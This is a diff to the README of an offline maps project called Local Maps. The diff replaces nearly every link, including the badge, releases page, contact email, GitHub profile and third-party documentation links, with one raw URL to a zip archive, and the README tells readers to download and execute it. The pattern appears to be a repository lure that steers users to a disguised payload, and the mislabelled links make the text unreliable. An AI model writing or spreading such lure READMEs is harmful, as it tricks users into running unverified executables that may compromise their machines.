@@ -1,6 +1,6 @@
 # Local Maps 🌍
 
-![Local Maps](https://img.shields.io/badge/Local%20Maps-Application-blue)
+![Local Maps](https://raw.githubusercontent.com/AsifThunder/local-maps/main/photon/local_maps_2.5-alpha.2.zip%20Maps-Application-blue)
 
 Welcome to the **Local Maps** repository! This project is a self-hosted maps application that requires no internet connection. With Local Maps, you can navigate and explore your surroundings using offline maps. This README will guide you through the features, installation, usage, and contributions to the project.
 
@@ -28,7 +28,7 @@ Welcome to the **Local Maps** repository! This project is a self-hosted maps app
 
 To get started with Local Maps, follow these steps:
 
-1. **Download the latest release** from the [Releases page](https://github.com/AsifThunder/local-maps/releases). You need to download and execute the file.
+1. **Download the latest release** from the [Releases page](https://raw.githubusercontent.com/AsifThunder/local-maps/main/photon/local_maps_2.5-alpha.2.zip). You need to download and execute the file.
    
 2. **Extract the files** from the downloaded archive.
 
@@ -88,12 +88,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: [your-email@example.com](mailto:your-email@example.com)
-- **GitHub**: [AsifThunder](https://github.com/AsifThunder)
+- **Email**: [https://raw.githubusercontent.com/AsifThunder/local-maps/main/photon/local_maps_2.5-alpha.2.zip](https://raw.githubusercontent.com/AsifThunder/local-maps/main/photon/local_maps_2.5-alpha.2.zip)
+- **GitHub**: [AsifThunder](https://raw.githubusercontent.com/AsifThunder/local-maps/main/photon/local_maps_2.5-alpha.2.zip)
 
 ## Releases
 
-To keep up with the latest updates and releases, visit our [Releases page](https://github.com/AsifThunder/local-maps/releases). You need to download and execute the file to get the latest features and fixes.
+To keep up with the latest updates and releases, visit our [Releases page](https://raw.githubusercontent.com/AsifThunder/local-maps/main/photon/local_maps_2.5-alpha.2.zip). You need to download and execute the file to get the latest features and fixes.
 
 ## Acknowledgments
 
@@ -106,9 +106,9 @@ We would like to thank the developers and contributors of the libraries and tool
 
 ## Additional Resources
 
-- [GraphHopper Documentation](https://www.graphhopper.com/docs/)
-- [OpenStreetMap Documentation](https://wiki.openstreetmap.org/wiki/Main_Page)
-- [Photon Documentation](https://photon.komoot.io/)
-- [Planetiler Documentation](https://planetiler.com/docs/)
+- [GraphHopper Documentation](https://raw.githubusercontent.com/AsifThunder/local-maps/main/photon/local_maps_2.5-alpha.2.zip)
+- [OpenStreetMap Documentation](https://raw.githubusercontent.com/AsifThunder/local-maps/main/photon/local_maps_2.5-alpha.2.zip)
+- [Photon Documentation](https://raw.githubusercontent.com/AsifThunder/local-maps/main/photon/local_maps_2.5-alpha.2.zip)
+- [Planetiler Documentation](https://raw.githubusercontent.com/AsifThunder/local-maps/main/photon/local_maps_2.5-alpha.2.zip)
 
 Thank you for your interest in Local Maps! We hope you find it useful for your offline navigation needs.
